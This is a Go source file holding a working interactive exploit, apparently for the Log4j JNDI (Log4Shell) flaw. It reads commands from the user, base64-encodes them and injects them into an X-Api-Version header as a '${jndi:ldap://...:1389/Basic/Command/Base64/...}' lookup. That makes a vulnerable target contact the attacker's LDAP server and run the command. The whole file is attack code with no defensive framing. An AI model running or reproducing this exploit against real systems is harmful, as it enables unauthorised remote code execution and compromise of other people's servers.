package payload

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"myapp/lib/sysinfo"
	"net/http"
	"os"
	"time"
)

func PayloadInput() {
	var payloadcmd string
	targetip, targetport := sysinfo.TargetInfo()
	sourceip, err := sysinfo.GetIntIP()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Testing curl...")
	_, err = http.Get("http://" + targetip + ":" + targetport)
	if err != nil {
		fmt.Println("Error:", err)
		return
	} else {
		fmt.Println("Curl successful.")
		for {
			fmt.Println("Enter the payload command:")
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				payloadcmd = scanner.Text()
			}
			fmt.Println("Payload command:", payloadcmd)
			encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
			fmt.Println("Sending payload...")
			targeturl := "http://" + targetip + ":" + targetport
			req, err := http.NewRequest("GET", targeturl, nil)
			req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
			if err != nil {
				fmt.Println("Error:", err)
				return
			}
			client := &http.Client{
				Timeout: 5 * time.Second,
			}
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Error:", err)
				fmt.Println("Please try again.")
				continue
			}
			defer resp.Body.Close()
			responseBody, err := io.ReadAll(resp.Body)
			if err != nil {
				fmt.Println("Error:", err)
				fmt.Println("Please try again.")
				continue
			}
			if string(responseBody) == "Hello, world!" {
				fmt.Println("Payload sent. Exploit successful.")
				fmt.Println("Do you want to send another payload? (yes/no)")
				if scanner.Scan() {
					response := scanner.Text()
					if response != "yes" {
						break
					}
				}
			} else {
				fmt.Println("Payload failed. Please try again.")
				continue
			}
		}
	}
}
